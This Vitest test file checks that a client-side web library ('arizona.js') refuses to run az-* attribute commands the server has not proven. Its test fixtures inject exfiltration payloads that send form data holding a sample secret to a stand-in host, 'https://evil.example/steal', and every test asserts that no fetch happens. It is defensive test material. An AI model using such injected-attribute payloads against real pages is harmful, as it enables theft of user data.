import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

// A command runs only under an `az-*` name the server proved to carry commands
// (the compile-time and render-time proofs `arizona_event_attrs` delivers). A
// static value under any other name is app data, possibly user-influenced, and
// `[0,"x"]` is a structurally valid command list, so no executor may parse one:
// not the delegated listeners, not the dedicated submit and drop listeners, not
// the reconnect replay.

/** A module instance with no delegation history: the proven set is module state. */
async function fresh() {
    vi.resetModules();
    return await import('./arizona.js');
}

/** Drive a module instance through a mocked Worker, exposing what it sent. */
function mockWorker(/** @type {any} */ mod) {
    /** @type {any[]} */
    const posted = [];
    /** @type {any} */
    let onmsg = null;
    const inst = {
        postMessage: (/** @type {any} */ d) => posted.push(d),
        set onmessage(fn) {
            onmsg = fn;
        },
        get onmessage() {
            return onmsg;
        },
        terminate: vi.fn(),
    };
    const Orig = globalThis.Worker;
    globalThis.Worker = /** @type {any} */ (
        function () {
            return inst;
        }
    );
    const disconnect = mod.connect('/ws');
    const frame = (/** @type {any[]} */ data) => inst.onmessage({ data });
    return {
        open: (reconnect = false) => frame([1, reconnect]),
        /** A server frame carrying `ops` and, optionally, a proven-name delta. */
        ops: (/** @type {any[]} */ ops, /** @type {string[]|null} */ names = null) =>
            frame([0, ops, null, false, names, null]),
        /** A frame carrying `names` as its proven set. */
        names: (/** @type {string[]} */ names) => frame([0, null, null, false, names, null]),
        resync: (/** @type {any[]} */ ops) => frame([0, ops, null, true, null, null]),
        close: (code = 1006) => frame([2, code]),
        sent: () => posted.filter((d) => d[0] === 1).map((d) => JSON.parse(d[1])),
        restore: () => {
            disconnect();
            globalThis.Worker = Orig;
        },
    };
}

const EVIL = 'https://evil.example/steal';

/**
 * Run `fn` while the document reports it is still parsing, as a classic script or
 * an early module calling `connect`/`start` before the parser reaches the embed.
 * @param {() => void} fn
 */
function whileLoading(fn) {
    Object.defineProperty(document, 'readyState', { configurable: true, get: () => 'loading' });
    try {
        fn();
    } finally {
        delete (/** @type {any} */ (document).readyState);
    }
}

/** The parser reaching the embed after the page, then finishing the document. */
function finishParsing(/** @type {string[]} */ names) {
    const el = document.createElement('script');
    el.type = 'application/json';
    el.id = 'arizona-attrs';
    el.textContent = JSON.stringify(names);
    document.body.appendChild(el);
    document.dispatchEvent(new Event('DOMContentLoaded'));
}

/** @type {ReturnType<typeof mockWorker> | null} */
let w = null;
/** @type {any} */
let fetchSpy;

beforeEach(() => {
    document.body.innerHTML = '';
    fetchSpy = vi
        .spyOn(globalThis, 'fetch')
        .mockImplementation(() => Promise.resolve(new Response('{}')));
});

afterEach(() => {
    w?.restore();
    w = null;
    vi.restoreAllMocks();
    document.body.innerHTML = '';
});

// The types the client used to delegate before any proof arrived.
const COMMON = [
    ['click', true],
    ['change', true],
    ['input', true],
    ['keydown', true],
    ['keyup', true],
    ['focusin', true],
    ['focusout', true],
];

describe('an unproven az-* value is data on a live page', () => {
    for (const [type, bubbles] of COMMON) {
        it(`does not run az-${type} the server never proved`, async () => {
            const mod = await fresh();
            document.body.innerHTML =
                `<div id="v" az-view><form id="f">` +
                `<input id="i" name="secret" value="hunter2" az-${type}='[0,"evil_${type}",{"x":1}]'>` +
                `</form></div>`;
            w = mockWorker(mod);
            w.open();
            w.names(['az-submit']);
            document.getElementById('i').dispatchEvent(new Event(type, { bubbles }));
            expect(w.sent()).toEqual([]);
        });
    }

    it('does not fetch another origin from an unproven az-change', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><form id="f" az-change='[22,"${EVIL}",{}]'>` +
            `<input id="i" name="secret" value="hunter2"></form></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-submit']);
        document.getElementById('i').dispatchEvent(new Event('change', { bubbles: true }));
        expect(fetchSpy).not.toHaveBeenCalled();
    });

    it('still runs the same value once its name is proven', async () => {
        const mod = await fresh();
        document.body.innerHTML = `<div id="v" az-view><button id="b" az-click='[0,"inc"]'>+</button></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        document.getElementById('b').click();
        expect(w.sent()).toEqual([['v', 'inc', {}]]);
    });

    // A diff op writing an `az-*` attribute proves nothing: the server proves a
    // command-valued dynamic on the frame that ships it (its name delta) and sends
    // the command as a JSON array, so a string here is the app's data -- which a
    // user may have chosen.
    it('does not prove a name a diff op writes a data value under', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view az="0"><form id="f">` +
            `<input id="i" az="1" name="secret" value="hunter2" az-select="[1]"></form></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        w.ops([[1, 'v:1', 'az-select', `[22,"${EVIL}",{}]`]]);
        document.getElementById('i').dispatchEvent(new Event('select', { bubbles: true }));
        expect(fetchSpy).not.toHaveBeenCalled();
        expect(document.getElementById('i')?.getAttribute('az-select')).toBe(`[22,"${EVIL}",{}]`);
    });

    it('does not prove a name a stream item patch writes a data value under', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view az="0"><ul az="1"><li az-key="k">` +
            `<input id="i" az="2" az-select="[1]"></li></ul></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        w.ops([[7, 'v:1', 'k', [[1, '2', 'az-select', `[22,"${EVIL}",{}]`]]]]);
        document.getElementById('i').dispatchEvent(new Event('select', { bubbles: true }));
        expect(fetchSpy).not.toHaveBeenCalled();
        expect(document.getElementById('i')?.getAttribute('az-select')).toBe(`[22,"${EVIL}",{}]`);
    });

    it('does not prove a name a ?local attribute slot writes under', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view>` +
            `<input id="i" az-local='{"a":{"az-select":"k"}}' az-select="[1]"></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        mod.set('v', 'k', `[22,"${EVIL}",{}]`);
        document.getElementById('i').dispatchEvent(new Event('select', { bubbles: true }));
        expect(fetchSpy).not.toHaveBeenCalled();
        expect(document.getElementById('i')?.getAttribute('az-select')).toBe(`[22,"${EVIL}",{}]`);
        // An array too: unlike a set_attr effect's, a `?local` value is client data.
        mod.set('v', 'k', [22, EVIL, {}]);
        document.getElementById('i').dispatchEvent(new Event('select', { bubbles: true }));
        document.getElementById('i')?.setAttribute('az-select', `[22,"${EVIL}",{}]`);
        document.getElementById('i').dispatchEvent(new Event('select', { bubbles: true }));
        expect(fetchSpy).not.toHaveBeenCalled();
    });

    it('still runs a command a set_attr effect writes under a new name', async () => {
        const mod = await fresh();
        document.body.innerHTML = `<div id="v" az-view><input id="i"></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        mod.applyEffects([[7, '#i', 'az-select', [0, 'picked']]]);
        document.getElementById('i').dispatchEvent(new Event('select', { bubbles: true }));
        expect(w.sent()).toEqual([['v', 'picked', { value: '' }]]);
    });

    // `arizona_js:set_attr/3` ships a command as an array, so a string under an
    // `az-*` name is data -- `set_attr(Sel, ~"az-select", ~"[1,2,3]")` -- and
    // proving its name would run every same-named data value on the page.
    it('does not prove a name a set_attr effect writes a string under', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><input id="i">` + `<input id="d" az-select='[0,"evil"]'></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        mod.applyEffects([[7, '#i', 'az-select', '[0,"picked"]']]);
        expect(document.getElementById('i')?.getAttribute('az-select')).toBe('[0,"picked"]');
        document.getElementById('i')?.dispatchEvent(new Event('select', { bubbles: true }));
        document.getElementById('d')?.dispatchEvent(new Event('select', { bubbles: true }));
        expect(w.sent()).toEqual([]);
    });

    it('proves a name a toggle_attr effect toggles between commands, not strings', async () => {
        const mod = await fresh();
        document.body.innerHTML = `<div id="v" az-view><input id="i"><input id="j"></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        mod.applyEffects([[21, '#j', 'az-focusin', '[0,"a"]', '[0,"b"]']]);
        document.getElementById('j')?.dispatchEvent(new Event('focusin', { bubbles: true }));
        mod.applyEffects([[21, '#j', 'az-focusout']]);
        document.getElementById('j')?.setAttribute('az-focusout', '[0,"c"]');
        document.getElementById('j')?.dispatchEvent(new Event('focusout', { bubbles: true }));
        expect(w.sent()).toEqual([]);
        mod.applyEffects([[21, '#i', 'az-select', [0, 'a'], [0, 'b']]]);
        const el = document.getElementById('i');
        el?.dispatchEvent(new Event('select', { bubbles: true }));
        mod.applyEffects([[21, '#i', 'az-select', [0, 'a'], [0, 'b']]]);
        el?.dispatchEvent(new Event('select', { bubbles: true }));
        expect(w.sent()).toEqual([
            ['v', 'a', { value: '' }],
            ['v', 'b', { value: '' }],
        ]);
    });

    // `set_attr(Sel, ~"az-x", [])` clears the handler: an empty command list runs
    // nothing, so it proves the name for nothing.
    it('writes an empty set_attr command list without proving its name', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><input id="i">` + `<input id="d" az-select='[0,"evil"]'></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        mod.applyEffects([[7, '#i', 'az-select', []]]);
        expect(document.getElementById('i')?.getAttribute('az-select')).toBe('[]');
        document.getElementById('i')?.dispatchEvent(new Event('select', { bubbles: true }));
        document.getElementById('d')?.dispatchEvent(new Event('select', { bubbles: true }));
        expect(w.sent()).toEqual([]);
    });

    // A toggle between a command and none turns a handler on and off. Only the
    // write of the command proves the name.
    it('toggles between a command and none, proving the name only on the command', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><input id="i">` + `<input id="d" az-select='[0,"evil"]'></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        const el = document.getElementById('i');
        const toggle = () => mod.applyEffects([[21, '#i', 'az-select', [], [0, 'a']]]);
        const select = (/** @type {string} */ id) =>
            document.getElementById(id)?.dispatchEvent(new Event('select', { bubbles: true }));
        toggle();
        expect(el?.getAttribute('az-select')).toBe('[]');
        select('d');
        expect(w.sent()).toEqual([]);
        toggle();
        expect(el?.getAttribute('az-select')).toBe('[0,"a"]');
        select('i');
        toggle();
        expect(el?.getAttribute('az-select')).toBe('[]');
        select('i');
        toggle();
        expect(el?.getAttribute('az-select')).toBe('[0,"a"]');
        expect(w.sent()).toEqual([['v', 'a', { value: '' }]]);
    });

    // Element ids can come from user input, and an earlier element with the
    // embed's id would win `getElementById`. Escaped content cannot create a
    // script element, and the server's embed comes after the page.
    it('reads only the last JSON script element as the embedded set', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><p id="arizona-attrs">["az-click"]</p>` +
            `<button id="b" az-click='[0,"evil"]'>x</button>` +
            `<script type="application/json" id="arizona-attrs">["az-click"]</script>` +
            `<button id="d" az-dblclick='[0,"ok"]'>y</button></div>` +
            `<script type="application/json" id="arizona-attrs">["az-dblclick"]</script>`;
        w = mockWorker(mod);
        w.open();
        document.getElementById('b')?.click();
        document.getElementById('d')?.dispatchEvent(new Event('dblclick', { bubbles: true }));
        expect(w.sent()).toEqual([['v', 'ok', {}]]);
    });

    // The documents the server writes: the embed is the body's last child, inserted
    // before the `</body>` that ends the document, or appended after a document that
    // ends otherwise -- whose content after `</body>` the parser places ahead of it.
    it.each([
        [
            'as the body last child',
            '</div><script type="application/json" id="arizona-attrs">["az-dblclick"]</script></body>\n</html>\n',
        ],
        [
            'after a document whose tail holds content',
            '</div></body><script type="application/json" id="arizona-attrs">["az-click"]</script></html>' +
                '<script type="application/json" id="arizona-attrs">["az-dblclick"]</script>',
        ],
    ])('reads the embed the server writes %s', async (_shape, tail) => {
        const mod = await fresh();
        const parsed = new DOMParser().parseFromString(
            '<!DOCTYPE html><html><head></head><body><div id="v" az-view>' +
                `<button id="b" az-click='[0,"evil"]'>x</button>` +
                `<button id="d" az-dblclick='[0,"ok"]'>y</button>` +
                `<script type="application/json" id="arizona-attrs">["az-click"]</script>` +
                tail,
            'text/html',
        );
        document.body.replaceWith(document.adoptNode(parsed.body));
        w = mockWorker(mod);
        w.open();
        document.getElementById('b')?.click();
        document.getElementById('d')?.dispatchEvent(new Event('dblclick', { bubbles: true }));
        expect(w.sent()).toEqual([['v', 'ok', {}]]);
    });

    it('reads an embed the parser reaches after connect', async () => {
        const mod = await fresh();
        document.body.innerHTML = `<div id="v" az-view><button id="b" az-click='[0,"inc"]'>+</button></div>`;
        whileLoading(() => {
            w = mockWorker(mod);
        });
        finishParsing(['az-click']);
        w?.open();
        document.getElementById('b')?.click();
        expect(w?.sent()).toEqual([['v', 'inc', {}]]);
    });

    // The layout's inline `connect` runs before the parser reaches the embed,
    // which comes after the page, so a read then would find only an element the
    // page content injected; the names it adds would stay proven.
    it('does not read an injected element when connect runs while the page loads', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><button id="b" az-click='[0,"evil"]'>x</button>` +
            `<script type="application/json" id="arizona-attrs">["az-click"]</script></div>`;
        whileLoading(() => {
            w = mockWorker(mod);
        });
        finishParsing(['az-dblclick']);
        w?.open();
        document.getElementById('b')?.click();
        expect(w?.sent()).toEqual([]);
    });

    it('does not run an unproven az-submit, before or after the socket opens', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><form id="f" az-submit='[22,"${EVIL}",{}]'>` +
            `<input name="secret" value="hunter2"></form></div>`;
        w = mockWorker(mod);
        const form = /** @type {HTMLFormElement} */ (document.getElementById('f'));
        // Before the open: a fetch needs no socket, so this is the HTTP-form path.
        const pre = new Event('submit', { bubbles: true, cancelable: true });
        form.dispatchEvent(pre);
        w.open();
        w.names(['az-click']);
        const post = new Event('submit', { bubbles: true, cancelable: true });
        form.dispatchEvent(post);
        expect(fetchSpy).not.toHaveBeenCalled();
        // Still never submitted natively: that would put the fields in the URL.
        expect(pre.defaultPrevented).toBe(true);
        expect(post.defaultPrevented).toBe(true);
    });

    // The submit is prevented either way (a native one would put the fields in the
    // URL), so a page whose proof has not arrived must say so, as a disconnected
    // drop does: the user pressed a button and nothing happened.
    it('warns and dispatches arizona:submit-dropped on an unproven az-submit', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><form id="f" az-submit='[22,"/login",{}]'>` +
            `<input name="u" value="a"></form></div>`;
        w = mockWorker(mod);
        const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
        /** @type {any[]} */
        const seen = [];
        const onDrop = (/** @type {Event} */ e) => seen.push(e);
        document.addEventListener('arizona:submit-dropped', onDrop);
        try {
            const form = document.getElementById('f');
            form?.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
            expect(fetchSpy).not.toHaveBeenCalled();
            expect(seen).toHaveLength(1);
            expect(seen[0].target).toBe(form);
            expect(seen[0].detail).toEqual({ reason: 'unproven' });
            expect(seen[0].cancelable).toBe(false);
            expect(warn.mock.calls.filter(([m]) => m.includes('az-submit dropped'))).toHaveLength(
                1,
            );
        } finally {
            document.removeEventListener('arizona:submit-dropped', onDrop);
        }
    });

    it('does not run an unproven az-drop', async () => {
        const mod = await fresh();
        document.body.innerHTML =
            `<div id="v" az-view><ul id="l" az-drop='[0,"evil_drop"]'>` +
            `<li id="a" az-key="a" draggable="true">a</li></ul></div>`;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        const start = new Event('dragstart', { bubbles: true });
        Object.defineProperty(start, 'dataTransfer', { value: { setData: () => {} } });
        document.getElementById('a').dispatchEvent(start);
        const drop = new Event('drop', { bubbles: true, cancelable: true });
        Object.defineProperty(drop, 'dataTransfer', { value: { getData: () => 'a' } });
        document.getElementById('a').dispatchEvent(drop);
        expect(w.sent()).toEqual([]);
    });

    it("does not replay a form's unproven az-change after a reconnect", async () => {
        const mod = await fresh();
        const view =
            `<div id="v" az-view><form id="f" az-change='[22,"${EVIL}",{}]'>` +
            `<input name="secret" value=""></form></div>`;
        document.body.innerHTML = view;
        w = mockWorker(mod);
        w.open();
        w.names(['az-click']);
        /** @type {HTMLInputElement} */ (document.querySelector('input')).value = 'hunter2';
        w.close();
        w.open(true);
        w.resync([[8, 'v', view]]);
        expect(fetchSpy).not.toHaveBeenCalled();
    });
});

describe('an unproven az-* value is data on a static page', () => {
    it('reads only the last JSON script element as the embedded set', async () => {
        vi.resetModules();
        const mod = await import('./arizona-static.js');
        document.body.innerHTML =
            `<p id="arizona-attrs">["az-click"]</p><div id="v" az-view>` +
            `<button id="b" type="button" az-click='[22,"${EVIL}",{}]'>x</button></div>` +
            `<script type="application/json" id="arizona-attrs">["az-dblclick"]</script>`;
        const stop = mod.start();
        document.getElementById('b')?.click();
        stop();
        expect(fetchSpy).not.toHaveBeenCalled();
    });

    it('reads an embed the parser reaches after start', async () => {
        vi.resetModules();
        const mod = await import('./arizona-static.js');
        document.body.innerHTML = `<div id="v" az-view><button id="b" type="button" az-click='[22,"/ok",{}]'>x</button></div>`;
        /** @type {() => void} */
        let stop = () => {};
        whileLoading(() => {
            stop = mod.start();
        });
        finishParsing(['az-click']);
        document.getElementById('b')?.click();
        stop();
        expect(fetchSpy).toHaveBeenCalledTimes(1);
    });

    it('does not read an injected element when start runs while the page loads', async () => {
        vi.resetModules();
        const mod = await import('./arizona-static.js');
        document.body.innerHTML =
            `<div id="v" az-view><button id="b" type="button" az-click='[22,"${EVIL}",{}]'>x</button>` +
            `<script type="application/json" id="arizona-attrs">["az-click"]</script></div>`;
        /** @type {() => void} */
        let stop = () => {};
        whileLoading(() => {
            stop = mod.start();
        });
        finishParsing(['az-dblclick']);
        document.getElementById('b')?.click();
        stop();
        expect(fetchSpy).not.toHaveBeenCalled();
    });

    it('does not run az-click the page did not embed', async () => {
        vi.resetModules();
        const mod = await import('./arizona-static.js');
        document.body.innerHTML =
            `<div id="v" az-view><form>` +
            `<button id="b" type="button" az-click='[22,"${EVIL}",{}]'>x</button></form></div>`;
        const stop = mod.start({ attrs: ['az-dblclick'] });
        document.getElementById('b').click();
        stop();
        expect(fetchSpy).not.toHaveBeenCalled();
    });
});
